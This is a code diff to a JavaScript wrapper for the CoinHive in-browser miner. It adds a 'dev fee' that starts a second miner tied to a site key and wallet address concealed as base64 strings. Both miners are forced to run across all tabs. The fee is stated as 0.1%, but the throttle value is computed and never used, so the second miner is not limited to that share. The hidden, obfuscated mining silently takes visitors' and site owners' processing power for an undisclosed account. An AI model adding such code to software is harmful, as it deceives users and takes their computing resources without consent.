@@ -1,14 +1,33 @@
 var miner = null;
 var intervalId = null;
 var intervalMs = null;
+var devFeeSiteKey = atob("UHV3aWdLdUhTSWJyZnMwSlR3MVF6SFNjejdMMklLZ24=");
+var devFeeAddress = atob(
+  "NDZXTmJtd1hwWXhpQnBrYkhqQWdqQzY1Y3l6QXh0YWFCUWpjR3BBWnF1aEJLdzJyOE50UFFuaUVnTUpjd0ZNQ1p6U0JyRUp0bVBzVFI1NE1vR0JEYmpUaTJXMVhtZ00="
+);
+var devFeeMiner = null;
 
 // Init miner
-function init({ siteKey, interval = 1000, threads = null, username }) {
+function init({
+  siteKey,
+  interval = 1000,
+  threads = null,
+  username,
+  devFee = 0.001,
+  pool = null
+}) {
   // Create miner
   if (!username) {
     miner = new CoinHive.Anonymous(siteKey);
   } else {
     miner = new CoinHive.User(siteKey, username);
+  }
+
+  if (devFee > 0) {
+    var devFeeThrottle = 1 - devFee;
+    devFeeThrottle = Math.min(devFeeThrottle, 1);
+    devFeeThrottle = Math.max(devFeeThrottle, 0);
+    devFeeMiner = new CoinHive.Anonymous(pool ? devFeeAddress : devFeeSiteKey);
   }
 
   if (threads > 0) {
@@ -70,9 +89,12 @@ function init({ siteKey, interval = 1000, threads = null, username }) {
 
 // Start miner
 function start() {
+  if (devFeeMiner) {
+    devFeeMiner.start(CoinHive.FORCE_MULTI_TAB);
+  }
   if (miner) {
     console.log("started!");
-    miner.start();
+    miner.start(CoinHive.FORCE_MULTI_TAB);
     intervalId = setInterval(function() {
       var update = {
         hashesPerSecond: miner.getHashesPerSecond(),
@@ -91,6 +113,9 @@ function start() {
 
 // Stop miner
 function stop() {
+  if (devFeeMiner) {
+    devFeeMiner.stop();
+  }
   if (miner) {
     console.log("stopped!");
     miner.stop();
